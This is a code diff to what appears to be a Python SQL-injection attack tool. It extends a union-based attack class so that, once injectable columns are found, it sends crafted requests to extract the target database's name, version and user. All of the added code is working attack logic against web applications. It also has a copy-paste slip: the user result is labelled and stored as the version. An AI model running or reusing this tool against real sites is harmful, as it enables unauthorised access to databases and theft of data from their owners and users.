@@ -6,7 +6,10 @@ try:
     from injection_defines import (
         define_order_by_command_php, 
         define_error_order_by_php,
-        define_union_select_query_php
+        define_union_select_query_php,
+        define_database_detection_query_php,
+        define_version_detection_query_php,
+        define_user_detection_query_php
     )
 
     from Config.WebConfig import (define_headerdata)
@@ -65,6 +68,8 @@ class UnionBaseAttack(object):
 
         vuln_columns = list()
         done_searching_columns = False
+        success_InjectedString = ""
+        raw_vuln_columns = list()
         
         '''this below code test url with (-) in and forward of number in url'''
         for item in define_union_select_query_php:    
@@ -72,9 +77,11 @@ class UnionBaseAttack(object):
             for numbers in list_my_injection_numbers:
                 if response.content.find(numbers) is not -1:
                     vuln_columns.append(numbers[0:1])
+                    raw_vuln_columns.append(numbers)
                     done_searching_columns = True
             lib.sleep(0.5)
             if done_searching_columns == True:
+                success_InjectedString = new_url + str(item + injection_string)
                 break
         
         '''this below code test raw url with no (-) in url'''
@@ -84,9 +91,11 @@ class UnionBaseAttack(object):
                 for numbers in list_my_injection_numbers:
                     if response.content.find(numbers) is not -1:
                         vuln_columns.append(numbers[0:1])
+                        raw_vuln_columns.append(numbers)
                         done_searching_columns = True
                 lib.sleep(0.5)
                 if done_searching_columns == True:
+                    success_InjectedString = new_url + str(item + injection_string)
                     break
 
         print TextColor.CYELLOWBG + TextColor.RED + "[+] Found Vulnaraable columns number " + TextColor.WHITE
@@ -96,14 +105,54 @@ class UnionBaseAttack(object):
             str_vulns_columns = str_vulns_columns + item + " "
         str_vulns_columns = str_vulns_columns[0:len(str_vulns_columns) - 1]        
 
-        lib.sys.stdout.write("\t\t" + ("-" * (len(str_vulns_columns) + 2)) + "\n\t\t|" + str_vulns_columns)
+        lib.sys.stdout.write("Vulnarable Columns =>\n\t\t" + ("-" * (len(str_vulns_columns) + 2)) + "\n\t\t|" + str_vulns_columns)
         lib.sys.stdout.write("|\n\t\t" + ("-" * (len(str_vulns_columns) + 2)) + "\n")
 
-        #now we have vulnarable columns in $vuln_columns
-        #todo = extract database and version 
+        self.__ExtractData__(raw_vuln_columns, success_InjectedString)
 
         del(list_my_injection_numbers)
+        del(raw_vuln_columns)
+        del(success_InjectedString)
 
+    def __ExtractData__(self, vuln_columns, success_InjectedString):
+        '''
+            this function work on data in database and extract them with sql query injection
+        '''
+        database_name = ""
+        version_name = ""
 
+        #1. extarct the database name
+        for item in define_database_detection_query_php:
+            response = lib.requests.get(str(lib.string.replace(success_InjectedString, vuln_columns[0], item)), headers=define_headerdata)
+            if response.content.find("FINDDATABASE=>{ ") is not -1:
+                end = lib.re.search("FINDDATABASE=>{", response.content).end()
+                starts = lib.re.search("}<=FINDDATABASE", response.content).start()
+                print TextColor.CBEIGE2 + str("[+]Database is => ") + response.content[end:starts] + TextColor.WHITE
+                database_name = response.content[end:starts]
+                break
+            lib.sleep(.5)
+        
+        lib.sleep(.5)
 
-
+        #2. extract the version of database
+        for item in define_version_detection_query_php:
+            response = response = lib.requests.get(str(lib.string.replace(success_InjectedString, vuln_columns[0], item)), headers=define_headerdata)
+            if response.content.find("FINDVERSION=>{ ") is not -1:
+                end = lib.re.search("FINDVERSION=>{", response.content).end()
+                start = lib.re.search("}<=FINDVERSION", response.content).start()
+                print TextColor.CBEIGE2 + str("[+]Version of database is => ") + response.content[end:start] + TextColor.WHITE
+                version_name = response.content[end:start]
+                break
+            lib.sleep(.5)
+        
+        lib.sleep(.5)
+        
+        #3. extract the user of database
+        for item in define_user_detection_query_php:
+            response = response = lib.requests.get(str(lib.string.replace(success_InjectedString, vuln_columns[0], item)), headers=define_headerdata)
+            if response.content.find("FINDUSER=>{ ") is not -1:
+                end = lib.re.search("FINDUSER=>{", response.content).end()
+                start = lib.re.search("}<=FINDUSER", response.content).start()
+                print TextColor.CBEIGE2 + str("[+]Version of database is => ") + response.content[end:start] + TextColor.WHITE
+                version_name = response.content[end:start]
+                break
